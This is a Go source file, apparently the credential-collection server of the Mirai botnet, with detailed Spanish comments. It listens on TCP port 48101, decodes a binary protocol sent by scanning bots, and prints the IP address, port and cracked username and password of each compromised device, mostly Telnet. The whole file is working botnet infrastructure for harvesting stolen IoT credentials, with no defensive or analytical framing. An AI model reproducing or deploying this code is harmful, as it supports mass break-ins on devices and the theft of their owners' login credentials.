/**
 * @file scanListen.go
 * @brief Servidor de recolección de credenciales del escáner
 *
 * Este programa recibe y registra las credenciales encontradas por
 * los bots durante el escaneo de dispositivos vulnerables.
 * Implementa un protocolo binario simple para recibir:
 * - IP y puerto del dispositivo encontrado
 * - Credenciales (usuario/contraseña) probadas exitosamente
 */

package main

import (
	"encoding/binary" // Para decodificación de datos binarios
	"errors"          // Para manejo de errores
	"fmt"             // Para logging de credenciales
	"net"             // Para manejo de conexiones TCP
	"time"            // Para timeouts de conexión
)

/**
 * Función principal del servidor de recolección
 *
 * Inicia un servidor TCP en el puerto 48101 que:
 * - Acepta conexiones de los bots escaneadores
 * - Maneja cada conexión en una goroutine separada
 * - Mantiene el servicio ejecutando continuamente
 */
func main() {
	// Iniciamos servidor TCP en puerto 48101
	l, err := net.Listen("tcp", "0.0.0.0:48101")
	if err != nil {
		fmt.Println(err)
		return
	}

	// Loop principal de aceptación de conexiones
	for {
		conn, err := l.Accept()
		if err != nil {
			break
		}
		// Cada conexión se maneja en su propia goroutine
		go handleConnection(conn)
	}
}

/**
 * handleConnection procesa una conexión entrante de un bot escaneador
 *
 * Esta función implementa el protocolo binario para recibir credenciales:
 *
 * Formato 1 (bufChk[0] == 0):
 *   [0x00][4B IP][2B Puerto][1B Long_Usuario][Usuario][1B Long_Pass][Pass]
 *
 * Formato 2 (bufChk[0] != 0):
 *   [1B IP_1][3B IP_2-4][1B Long_Usuario][Usuario][1B Long_Pass][Pass]
 *   (Puerto = 23 implícito)
 *
 * @param conn Conexión TCP con el bot escaneador
 */
func handleConnection(conn net.Conn) {
	// Aseguramos que la conexión se cierre al terminar
	defer conn.Close()

	// Establecemos timeout de 10 segundos
	conn.SetDeadline(time.Now().Add(10 * time.Second))

	// Leemos primer byte para determinar formato
	bufChk, err := readXBytes(conn, 1)
	if err != nil {
		return
	}

	var ipInt uint32   // IP como entero de 32 bits
	var portInt uint16 // Puerto como entero de 16 bits

	// Procesamos según el formato detectado
	if bufChk[0] == 0 {
		// Formato 1: IP (4 bytes) + Puerto (2 bytes)
		ipBuf, err := readXBytes(conn, 4)
		if err != nil {
			return
		}
		ipInt = binary.BigEndian.Uint32(ipBuf)

		portBuf, err := readXBytes(conn, 2)
		if err != nil {
			return
		}
		portInt = binary.BigEndian.Uint16(portBuf)
	} else {
		// Formato 2: IP (3 bytes + 1 leído) + Puerto 23 implícito
		ipBuf, err := readXBytes(conn, 3)
		if err != nil {
			return
		}
		ipBuf = append(bufChk, ipBuf...)
		ipInt = binary.BigEndian.Uint32(ipBuf)
		portInt = 23 // Puerto Telnet por defecto
	}

	// Leemos longitud del nombre de usuario
	uLenBuf, err := readXBytes(conn, 1)
	if err != nil {
		return
	}
	// Leemos el nombre de usuario
	usernameBuf, err := readXBytes(conn, int(byte(uLenBuf[0])))

	// Leemos longitud de la contraseña
	pLenBuf, err := readXBytes(conn, 1)
	if err != nil {
		return
	}
	// Leemos la contraseña
	passwordBuf, err := readXBytes(conn, int(byte(pLenBuf[0])))
	if err != nil {
		return
	}

	// Imprimimos las credenciales encontradas en formato:
	// IP:Puerto Usuario:Contraseña
	fmt.Printf("%d.%d.%d.%d:%d %s:%s\n",
		(ipInt>>24)&0xff,    // Octeto 1
		(ipInt>>16)&0xff,    // Octeto 2
		(ipInt>>8)&0xff,     // Octeto 3
		ipInt&0xff,          // Octeto 4
		portInt,             // Puerto
		string(usernameBuf), // Usuario
		string(passwordBuf)) // Contraseña
}

/**
 * readXBytes lee exactamente la cantidad especificada de bytes
 *
 * Esta función realiza lecturas parciales hasta completar la cantidad
 * solicitada o encontrar un error. Es necesaria porque conn.Read()
 * puede retornar menos bytes de los solicitados.
 *
 * @param conn   Conexión TCP de la que leer
 * @param amount Cantidad exacta de bytes a leer
 * @return       Buffer con los bytes leídos y error si falla
 */
func readXBytes(conn net.Conn, amount int) ([]byte, error) {
	// Creamos buffer del tamaño exacto
	buf := make([]byte, amount)
	tl := 0 // Total de bytes leídos

	// Leemos hasta completar la cantidad solicitada
	for tl < amount {
		rd, err := conn.Read(buf[tl:])
		if err != nil || rd <= 0 {
			return nil, errors.New("Failed to read")
		}
		tl += rd // Actualizamos el total leído
	}

	return buf, nil
}
